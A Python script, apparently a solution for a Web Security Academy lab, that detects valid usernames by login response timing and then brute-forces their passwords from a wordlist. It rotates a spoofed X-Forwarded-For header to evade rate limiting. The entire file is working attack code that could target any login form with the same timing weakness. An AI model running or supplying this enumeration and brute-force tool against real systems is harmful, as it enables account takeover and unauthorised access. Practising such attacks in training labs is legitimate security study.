#!/usr/bin/env python3

# Lab: Username enumeration via response timing

import requests
import sys
import urllib3

### CONFIGURE THESE VALUES ###
host = "<your_host>.web-security-academy.net"
path = "login"
valid_login = 'wiener'
valid_password = 'peter'
usernames_file = "<path_to_file>"
passwords_file = "<path_to_file>"
##############################

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def process_login_time(idx, username, password=''):
	url = "https://{host}/{path}".format(host=host, path=path)
	#proxies = {"https":"https://127.0.0.1:8080"}
	headers = {
	"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	"X-Forwarded-For":"200.3.23.{x}".format(x=idx) 
	}


	data = "username={u}&password={p}".format(u=username, p=password)
	response = requests.post(url, headers=headers, data=data, verify=False)
	return response.elapsed.total_seconds()

if __name__ == "__main__":
	idx = 0
	valid_login_time = process_login_time(idx, valid_login, valid_password)
	print("Valid login time: {t}".format(t=valid_login_time))
	idx +=1
	wrong_password = 'wronfdsgeaggAndLongPassword123VeryVeryVeryVeryLong92929292929292929125251252151251251252dgk24ig0203rfkekfewkgwt2g3g4pohmbpwo3ytgvpaoemgpweomf239tmg3q9t'
	valid_login_bad_pass_time = process_login_time(idx, valid_login, wrong_password)
	print("Valid login & bad password time: {t}".format(t=valid_login_bad_pass_time))

	candidate_usernames = []

	with open(usernames_file, 'r') as f:
		for line in f:
			idx+=1
			time=process_login_time(idx, line.strip(), wrong_password)
			if abs(valid_login_bad_pass_time-time) < 0.2:
				username = line.strip()
				candidate_usernames.append(username)
	for name in candidate_usernames:
		with open(passwords_file, 'r') as f:
			for line in f:
				idx+=1
				time=process_login_time(idx, name, line.strip())
				if abs(valid_login_bad_pass_time-time) < 0.12:
					password = line.strip()
					print("Candidate credentials pair: {u}:{p}".format(u=name, p=password))
	print("Enumeration completed.")